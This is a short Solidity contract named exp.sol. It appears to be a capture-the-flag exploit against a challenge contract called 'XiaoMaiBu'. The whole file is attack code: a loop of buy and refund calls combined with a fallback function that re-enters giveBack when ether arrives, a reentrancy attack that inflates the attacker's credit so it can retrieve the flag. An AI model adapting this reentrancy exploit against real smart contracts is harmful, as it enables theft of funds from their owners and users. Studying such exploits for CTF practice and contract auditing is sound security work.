pragma solidity ^0.4.23;
// Author : imagin
// Blog : https://imagin.vip/
// Filename : exp.sol

import "Taqini.sol";
contract exp{
    XiaoMaiBu x;
    uint8 num;
    uint8 times;
    constructor (address addr){
        x = XiaoMaiBu(addr);
    }
    
    function getFlag() public payable returns (string){
        x.deposit.value(1)();
        for(uint8 i = 0; i < 5; i++){
            num = i;
            attack();
            attack();
        }
        x.buy(5);
        return x.getFlag();
    }
    
    function flag() public view returns (string){
        return x.getFlag();
    }
    
    function attack() public payable{
        times = 1;
        x.buy(num);
        x.giveBack(num);
        x.giveAllBack(num);
    }
    
    function getMyCredit() public view returns (uint256){
        return x.getCredit(this);
    }
    
    function getMyGood(uint8 index) public view returns (uint8){
        return x.getMyGood(index);
    }
    
    function() public payable{
        if(times > 0){
            times --;
            x.giveBack(num);
        }
        
    }
}